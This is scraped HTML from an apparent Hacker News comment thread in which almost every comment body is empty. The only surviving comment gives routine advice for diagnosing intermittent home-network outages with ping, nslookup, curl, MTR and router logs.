&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;5.06&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25802976&quot; readability=&quot;2.5329341317365&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.2664670658683&quot;&gt;&lt;tr readability=&quot;2.5329341317365&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803017&quot; readability=&quot;3.3989637305699&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.699481865285&quot;&gt;&lt;tr readability=&quot;3.3989637305699&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;80&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;3.8238341968912&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803820&quot; readability=&quot;3.3555555555556&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.6777777777778&quot;&gt;&lt;tr readability=&quot;3.3555555555556&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;80&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804299&quot; readability=&quot;2.4102564102564&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.2051282051282&quot;&gt;&lt;tr readability=&quot;2.4102564102564&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;80&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25805655&quot; readability=&quot;4.0441176470588&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.0220588235294&quot;&gt;&lt;tr readability=&quot;4.0441176470588&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;120&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25802858&quot; readability=&quot;4.7727272727273&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.3863636363636&quot;&gt;&lt;tr readability=&quot;4.7727272727273&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;6.2045454545455&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803438&quot; readability=&quot;7.6679841897233&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.8339920948617&quot;&gt;&lt;tr readability=&quot;7.6679841897233&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;5.7509881422925&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25802928&quot; readability=&quot;5.5964912280702&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803546&quot; readability=&quot;6.7881355932203&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.3940677966102&quot;&gt;&lt;tr readability=&quot;6.7881355932203&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803601&quot; readability=&quot;3.5731225296443&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.7865612648221&quot;&gt;&lt;tr readability=&quot;3.5731225296443&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25806716&quot; readability=&quot;7.7664233576642&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.8832116788321&quot;&gt;&lt;tr readability=&quot;7.7664233576642&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;7.2810218978102&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25802782&quot; readability=&quot;2.6010638297872&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.3005319148936&quot;&gt;&lt;tr readability=&quot;2.6010638297872&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803181&quot; readability=&quot;11.667938931298&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;5.8339694656489&quot;&gt;&lt;tr readability=&quot;11.667938931298&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;8.2647900763359&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803381&quot; readability=&quot;2.4915254237288&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.2457627118644&quot;&gt;&lt;tr readability=&quot;2.4915254237288&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;80&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25802926&quot; readability=&quot;4.4230769230769&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.2115384615385&quot;&gt;&lt;tr readability=&quot;4.4230769230769&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25802956&quot; readability=&quot;2.2871287128713&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803243&quot; readability=&quot;5.3333333333333&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.6666666666667&quot;&gt;&lt;tr readability=&quot;5.3333333333333&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803354&quot; readability=&quot;2.5454545454545&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.2727272727273&quot;&gt;&lt;tr readability=&quot;2.5454545454545&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803832&quot; readability=&quot;3.5282051282051&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.7641025641026&quot;&gt;&lt;tr readability=&quot;3.5282051282051&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;80&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803134&quot; readability=&quot;5.580547112462&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.790273556231&quot;&gt;&lt;tr readability=&quot;5.580547112462&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803185&quot; readability=&quot;3.5698924731183&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.7849462365591&quot;&gt;&lt;tr readability=&quot;3.5698924731183&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804267&quot; readability=&quot;8.5665137614679&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;4.2832568807339&quot;&gt;&lt;tr readability=&quot;8.5665137614679&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;80&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;5.7110091743119&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804743&quot; readability=&quot;2.5190839694656&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.2595419847328&quot;&gt;&lt;tr readability=&quot;2.5190839694656&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25802820&quot; readability=&quot;7.5870967741935&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.7935483870968&quot;&gt;&lt;tr readability=&quot;7.5870967741935&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;4.2677419354839&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803513&quot; readability=&quot;1.725&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803619&quot; readability=&quot;1.1320754716981&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25806063&quot; readability=&quot;4.7297297297297&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.3648648648649&quot;&gt;&lt;tr readability=&quot;4.7297297297297&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25806456&quot; readability=&quot;13.309297912713&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;6.6546489563567&quot;&gt;&lt;tr readability=&quot;13.309297912713&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;6.1793168880455&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25806741&quot; readability=&quot;4.4327731092437&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.2163865546218&quot;&gt;&lt;tr readability=&quot;4.4327731092437&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25805821&quot; readability=&quot;21.658031088083&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;10.829015544041&quot;&gt;&lt;tr readability=&quot;21.658031088083&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;26.088082901554&quot;&gt;

&lt;br/&gt;&lt;div class=&quot;comment&quot; readability=&quot;26.92119089317&quot;&gt;&lt;span class=&quot;commtext c00&quot;&gt;Hack at the problem until its reduced to its purest form.&lt;/span&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;&amp;gt; My devices remain connected to the network, but all traffic dies.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;Can the devices send packets within the network, but not the internet? Use ping to double check. if no, do you have any wired devices to confirm rather or not its wireless interference vs the router doing some sort of maintenance task.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;Does this impact all protocols? tcp/udp/imcp. I've seen random network hiccups only impact tcp before.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;ping tests imcp, dns (nslookup on windows/host on linux) tests udp (and can also test tcp) http tests udp and tcp, depending on browser and service. curl can let you confirm the test is going over tcp.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;MTR is likely your final solution for investigating this. It is like a traceroute that rapid fires out to get second by second details about all the hops in a network path. The types of errors you get can also tell you why.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;If it ends up being tcp only and internet based, things get harder, some mtr clients support using tcp instead of imcp to find hops where tcp breaks, but your isp routers might also refused to reply to such packets directly.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;Finally, watching the lights on the router and modem (if seperate) can be illuminating. First, get a feel for normal light operation, normal activity blink speed, etc, then starting a few minutes before the event normally happens, just observe the lights for changes until the event ends while also using your phone to know when the event has started and ended.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;On that note, look up how to access web consoles on the router (and modem if seperate). They may have event logs that tell you if anything is happening, like ip renewals, or if they are getting commands from the isp to do things.&lt;/span&gt;&lt;/p&gt;

&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25802878&quot; readability=&quot;2.5519480519481&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.275974025974&quot;&gt;&lt;tr readability=&quot;2.5519480519481&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803102&quot; readability=&quot;9.4709897610922&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;4.7354948805461&quot;&gt;&lt;tr readability=&quot;9.4709897610922&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;6.6296928327645&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803044&quot; readability=&quot;3.5&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.75&quot;&gt;&lt;tr readability=&quot;3.5&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803204&quot; readability=&quot;4.6677215189873&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.3338607594937&quot;&gt;&lt;tr readability=&quot;4.6677215189873&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;5.6012658227848&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804234&quot; readability=&quot;3.1094339622642&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803236&quot; readability=&quot;1.741935483871&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803633&quot; readability=&quot;1.4177215189873&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25802922&quot; readability=&quot;6.6975308641975&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.3487654320988&quot;&gt;&lt;tr readability=&quot;6.6975308641975&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;6.2191358024691&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803200&quot; readability=&quot;4.9102333931777&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.4551166965889&quot;&gt;&lt;tr readability=&quot;4.9102333931777&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25806360&quot; readability=&quot;3.0803571428571&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803302&quot; readability=&quot;5.6658227848101&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.8329113924051&quot;&gt;&lt;tr readability=&quot;5.6658227848101&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;7.0822784810127&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803916&quot; readability=&quot;9.3367346938776&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;4.6683673469388&quot;&gt;&lt;tr readability=&quot;9.3367346938776&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25805145&quot; readability=&quot;2.6166666666667&quot;&gt;&lt;td&gt;
